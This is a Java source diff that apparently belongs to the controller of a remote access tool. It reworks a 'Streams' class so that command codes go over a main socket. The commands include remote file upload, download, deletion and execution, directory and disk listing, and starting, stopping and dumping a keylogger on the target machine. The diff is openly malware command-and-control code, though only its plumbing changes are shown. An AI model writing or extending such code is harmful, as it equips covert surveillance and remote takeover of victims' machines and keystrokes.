@@ -33,6 +33,7 @@ public class Streams {
 
     private final Socket clientSocket;
 
+    private Streams mainStream;
 
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
 
@@ -43,6 +44,16 @@ public class Streams {
         OutputStream os = socket.getOutputStream();
         dis = new DataInputStream(is);
         dos = new DataOutputStream(os);
+    }
+
+    public Streams(Socket socket, Streams mainStream) throws IOException {
+        if (socket == null) throw new IllegalArgumentException();
+        clientSocket = socket;
+        InputStream is = socket.getInputStream();
+        OutputStream os = socket.getOutputStream();
+        dis = new DataInputStream(is);
+        dos = new DataOutputStream(os);
+        this.mainStream = mainStream;
     }
 
     public byte[] receiveBytes() throws IOException {
@@ -141,6 +152,7 @@ public class Streams {
                 return listToNetworkInformation(networkJSON);
             }
             case DISK -> {
+                mainStream.sendSize(2);
                 List<String> listOfDisks = readList();
                 System.out.println(listOfDisks);
                 return listOfDisks.toArray(new String[0]);
@@ -156,7 +168,7 @@ public class Streams {
 
     public void sendAction(Action action, String destinationPath, int length) throws IOException {
         if (action == Action.UPLOAD) {
-            sendSize(10);
+            mainStream.sendSize(10);
             sendString(destinationPath);
             sendSize(length);
         }
@@ -164,7 +176,7 @@ public class Streams {
 
     public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
         if (action == Action.COPY) {
-            sendSize(6);
+            mainStream.sendSize(6);
             sendList(fileList);
             sendList(directoryList);
         }
@@ -172,7 +184,7 @@ public class Streams {
 
     public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
         if (action == Action.MOVE) {
-            sendSize(7);
+            mainStream.sendSize(7);
             sendList(fileList);
             sendString(directory);
         }
@@ -180,6 +192,7 @@ public class Streams {
 
     public List<String> sendAndReadAction(Action action, String name) throws IOException {
         if (action == Action.R_A_DIR) {
+            mainStream.sendSize(3);
             sendString(name);
             return new ArrayList<>(Arrays.asList(readString().split("\\|")));
         }
@@ -224,15 +237,15 @@ public class Streams {
     public void sendAction(Action action, List<String> fileList) throws IOException {
         switch (action) {
             case DOWNLOAD -> {
-                sendSize(5);
+                mainStream.sendSize(5);
                 sendList(fileList);
             }
             case DELETE -> {
-                sendSize(8);
+                mainStream.sendSize(8);
                 sendList(fileList);
             }
             case RUN -> {
-                sendSize(9);
+                mainStream.sendSize(9);
                 sendList(fileList);
             }
         }
@@ -241,8 +254,8 @@ public class Streams {
     public void sendAction(KeyloggerEvents event) throws IOException {
         String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/" + new Time().getTime();
         switch (event) {
-            case START -> sendSize(12);
-            case STOP -> sendSize(13);
+            case START -> mainStream.sendSize(12);
+            case STOP -> mainStream.sendSize(13);
             case DUMP_LAST -> {
                 sendSize(4);
                 if (readSize()!=-1) {
@@ -253,7 +266,7 @@ public class Streams {
                 }
             }
             case DUMP_ALL -> {
-                sendSize(14);
+                mainStream.sendSize(14);
                 if (readSize()!=-1) {
                     receiveLogs(nameOfSession);
                     FolderOpener.open(nameOfSession);
@@ -418,4 +431,7 @@ public class Streams {
     }
 
 
+    public void setMainStream(Streams mainStream) {
+        this.mainStream = mainStream;
+    }
 }
